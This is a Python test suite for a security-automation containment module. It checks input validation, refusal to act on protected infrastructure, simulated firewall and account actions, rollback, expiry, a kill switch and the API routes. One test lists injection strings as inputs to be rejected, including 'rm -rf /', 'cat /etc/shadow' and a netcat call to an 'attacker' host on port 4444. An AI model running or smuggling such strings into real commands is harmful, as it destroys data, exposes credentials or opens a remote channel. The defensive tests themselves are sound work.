"""
Unit and integration tests for SOAR Containment Actions and Safety Guardrails.

Tests:
  - Refusal of protected infrastructure (loopback, gateway, DC, root user, high criticality)
  - Rejection of invalid / malicious command injection targets ("1.2.3.4; rm -rf")
  - Safe simulated dry-run execution and audit persistence
  - State rollback restoring status to rolled_back
  - TTL auto-expiration of active containment records
  - Global kill switch blocking execution
  - REST API endpoints (/api/v1/soar/actions, /rollback, /status)
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
import pytest
from fastapi.testclient import TestClient

from hsoc.config import get_settings
from hsoc.db import FeedbackORM, IncidentORM, SOARActionORM, SessionLocal, init_db
from hsoc.soar.actions import (
    BlockIPAction,
    DisableUserAction,
    IsolateHostAction,
    SOAREngine,
    get_soar_engine,
    is_target_protected,
    parse_step_to_action,
    validate_target,
)


@pytest.fixture(autouse=True)
def setup_db():
    init_db()
    db = SessionLocal()
    # Create mock incident for testing if absent
    inc = db.query(IncidentORM).filter(IncidentORM.incident_id == "INC-TEST-SOAR").first()
    if not inc:
        inc = IncidentORM(
            incident_id="INC-TEST-SOAR",
            created_at=datetime.now(timezone.utc),
            updated_at=datetime.now(timezone.utc),
            severity="high",
            tactics=["credential_access", "lateral_movement"],
            alert_ids=["ALT-1", "ALT-2"],
            entity_keys=["192.168.56.200", "web-srv-01", "dev_user"],
            timeline=[],
            techniques=["T1110.001"],
            domain="authentication",
            status="open",
        )
        db.add(inc)
        db.commit()
    db.close()


# ---------------------------------------------------------------------------
# 1. Target Validation & Injection Prevention
# ---------------------------------------------------------------------------

def test_validate_target_valid_types():
    assert validate_target("block_ip", "192.168.56.200")[0] is True
    assert validate_target("block_ip", "10.0.1.5")[0] is True
    assert validate_target("isolate_host", "web-srv-01")[0] is True
    assert validate_target("isolate_host", "node-42.corp.local")[0] is True
    assert validate_target("disable_user", "compromised_user")[0] is True
    assert validate_target("disable_user", "j.doe")[0] is True


def test_validate_target_injection_rejection():
    # Shell command injection attempts via untrusted log strings
    bad_targets = [
        "1.2.3.4; rm -rf /",
        "10.0.0.1 && cat /etc/shadow",
        "srv-01 | nc attacker 4444",
        "user`whoami`",
        "192.168.1.1\nreboot",
        "attacker$HOME",
        "192.168.56.200; iptables -F",
    ]
    for bad in bad_targets:
        valid_ip, _ = validate_target("block_ip", bad)
        assert valid_ip is False, f"Failed to reject dangerous IP target: {bad}"

        valid_host, _ = validate_target("isolate_host", bad)
        assert valid_host is False, f"Failed to reject dangerous host target: {bad}"

        valid_user, _ = validate_target("disable_user", bad)
        assert valid_user is False, f"Failed to reject dangerous user target: {bad}"


# ---------------------------------------------------------------------------
# 2. Protected Infrastructure & Critical Asset Refusal
# ---------------------------------------------------------------------------

def test_protected_targets_refusal():
    # 1. Loopback / local host
    assert is_target_protected("block_ip", "127.0.0.1")[0] is True
    assert is_target_protected("block_ip", "::1")[0] is True
    assert is_target_protected("block_ip", "0.0.0.0")[0] is True

    # 2. Gateways and domain controllers
    assert is_target_protected("isolate_host", "dc-01")[0] is True
    assert is_target_protected("isolate_host", "dc-02")[0] is True
    assert is_target_protected("isolate_host", "gateway")[0] is True
    assert is_target_protected("isolate_host", "hsoc-core")[0] is True

    # 3. Protected system accounts
    assert is_target_protected("disable_user", "root")[0] is True
    assert is_target_protected("disable_user", "administrator")[0] is True
    assert is_target_protected("disable_user", "system")[0] is True

    # 4. High-criticality asset check
    assert is_target_protected("isolate_host", "app-prod-01", asset_criticality=5)[0] is True
    assert is_target_protected("isolate_host", "app-dev-01", asset_criticality=2)[0] is False


# ---------------------------------------------------------------------------
# 3. Action Classes & Simulated Execution
# ---------------------------------------------------------------------------

def test_action_classes_simulation():
    # Block IP
    b_act = BlockIPAction(target="198.51.100.99", incident_id="INC-1", ttl_minutes=30)
    dry_b = b_act.dry_run()
    assert dry_b["mode"] == "dry_run"
    assert "iptables -A" in dry_b["simulated_command"]

    exec_b = b_act.execute()
    assert exec_b["mode"] == "simulated_active"

    roll_b = b_act.rollback()
    assert "iptables -D" in roll_b["simulated_command"]

    # Isolate Host
    h_act = IsolateHostAction(target="compromised-srv", incident_id="INC-1")
    assert "isolate" in h_act.dry_run()["simulated_command"]
    assert "unisolate" in h_act.rollback()["simulated_command"]

    # Disable User
    u_act = DisableUserAction(target="hacked_dev", incident_id="INC-1")
    assert "usermod -L" in u_act.dry_run()["simulated_command"]
    assert "usermod -U" in u_act.rollback()["simulated_command"]


# ---------------------------------------------------------------------------
# 4. SOAR Engine Audit Logging, Rollback & Rejection
# ---------------------------------------------------------------------------

def test_soar_engine_execute_and_rollback():
    engine = SOAREngine()
    res = engine.execute_action(
        incident_id="INC-TEST-SOAR",
        step="Block IP 198.51.100.50 at perimeter firewall",
        approved_by="analyst_alice",
    )
    assert res["success"] is True
    assert res["status"] == "simulated"
    assert res["target"] == "198.51.100.50"
    assert res["action_type"] == "block_ip"
    assert "30 min" in res["status_line"]

    action_id = res["action_id"]

    # Verify audit record in DB
    db = SessionLocal()
    row = db.query(SOARActionORM).filter(SOARActionORM.action_id == action_id).first()
    assert row is not None
    assert row.status == "simulated"
    assert row.approved_by == "analyst_alice"
    assert row.is_dry_run is True
    db.close()

    # Rollback action
    roll_res = engine.rollback_action(action_id, reason="False positive identified")
    assert roll_res["success"] is True
    assert roll_res["status"] == "rolled_back"

    # Verify DB updated
    db = SessionLocal()
    row2 = db.query(SOARActionORM).filter(SOARActionORM.action_id == action_id).first()
    assert row2.status == "rolled_back"
    assert row2.rolled_back_at is not None
    assert row2.rollback_reason == "False positive identified"
    db.close()

    # Second rollback must fail gracefully
    dup_roll = engine.rollback_action(action_id)
    assert dup_roll["success"] is False


def test_soar_engine_reject_step():
    engine = SOAREngine()
    res = engine.reject_action(
        incident_id="INC-TEST-SOAR",
        step="Isolate database host db-01",
        rejected_by="analyst_bob",
        reason="Business continuity override",
    )
    assert res["success"] is True
    assert res["status"] == "rejected"

    db = SessionLocal()
    row = db.query(SOARActionORM).filter(SOARActionORM.action_id == res["action_id"]).first()
    assert row is not None
    assert row.status == "rejected"
    assert row.approved_by == "analyst_bob"

    # Verify analyst feedback table updated
    fb = db.query(FeedbackORM).filter(FeedbackORM.incident_id == "INC-TEST-SOAR", FeedbackORM.decision == "rejected").first()
    assert fb is not None
    db.close()


def test_soar_engine_ttl_auto_expiration():
    engine = SOAREngine()
    res = engine.execute_action(
        incident_id="INC-TEST-SOAR",
        step="Block IP 198.51.100.77",
    )
    action_id = res["action_id"]

    # Manually backdate expires_at in DB to simulate passage of time
    db = SessionLocal()
    row = db.query(SOARActionORM).filter(SOARActionORM.action_id == action_id).first()
    row.expires_at = datetime.now(timezone.utc) - timedelta(minutes=5)
    db.commit()
    db.close()

    expired = engine.check_expirations()
    assert action_id in expired

    db = SessionLocal()
    row_check = db.query(SOARActionORM).filter(SOARActionORM.action_id == action_id).first()
    assert row_check.status == "expired"
    db.close()


def test_soar_engine_kill_switch():
    engine = SOAREngine()
    # Temporarily activate kill switch in config
    cfg = get_settings().soar
    orig_ks = cfg.get("kill_switch", False)
    cfg["kill_switch"] = True

    try:
        res = engine.execute_action(
            incident_id="INC-TEST-SOAR",
            step="Block IP 198.51.100.88",
        )
        assert res["success"] is False
        assert res["status"] == "refused"
        assert "kill switch" in res["message"].lower()

        # Audit log must record refusal
        db = SessionLocal()
        row = db.query(SOARActionORM).filter(SOARActionORM.action_id == res["action_id"]).first()
        assert row is not None
        assert row.status == "refused"
        assert "kill switch" in row.details.get("reason", "").lower()
        db.close()
    finally:
        cfg["kill_switch"] = orig_ks


# ---------------------------------------------------------------------------
# 5. REST API Integration Tests
# ---------------------------------------------------------------------------

def test_soar_api_endpoints():
    from hsoc.api.routes import soar
    from hsoc.api.routes.soar import SOARActionRequest, SOARRollbackRequest
    db = SessionLocal()

    try:
        # 1. Status endpoint
        s_data = soar.get_soar_status(db=db)
        assert "enabled" in s_data
        assert "dry_run" in s_data

        # 2. Approve action via route handler
        req = SOARActionRequest(
            incident_id="INC-TEST-SOAR",
            step="Block IP 198.51.100.120 at perimeter firewall",
            decision="approved",
            approved_by="analyst_api",
        )
        a_data = soar.handle_action(payload=req, db=db)
        assert a_data["success"] is True
        assert a_data["status"] == "simulated"
        action_id = a_data["action_id"]

        # 3. List actions via route handler
        l_data = soar.list_actions(incident_id="INC-TEST-SOAR", db=db)
        assert any(r["action_id"] == action_id for r in l_data)

        # 4. Rollback action via route handler
        roll_req = SOARRollbackRequest(reason="Testing API rollback")
        r_data = soar.rollback_action(action_id=action_id, payload=roll_req, db=db)
        assert r_data["success"] is True
        assert r_data["status"] == "rolled_back"
    finally:
        db.close()


def test_approved_step_target_matches_audited_target():
    engine = SOAREngine()
    step = "Isolate host 192.168.56.20 from internal subnets and inspect authentication logs."

    res = engine.execute_action(
        incident_id="INC-TEST-SOAR",
        step=step,
        approved_by="analyst_verifier",
    )

    approved_step_target = "192.168.56.20"
    assert res["target"] == approved_step_target
    assert res["action_type"] == "isolate_host"

    db = SessionLocal()
    row = db.query(SOARActionORM).filter(SOARActionORM.action_id == res["action_id"]).first()
    assert row is not None
    assert row.target == approved_step_target
    assert row.target == res["target"]
    assert "Isolated 192.168.56.20 (simulated)" in res["status_line"]
    assert row.details.get("resolved_host") == "db-srv-01"
    db.close()
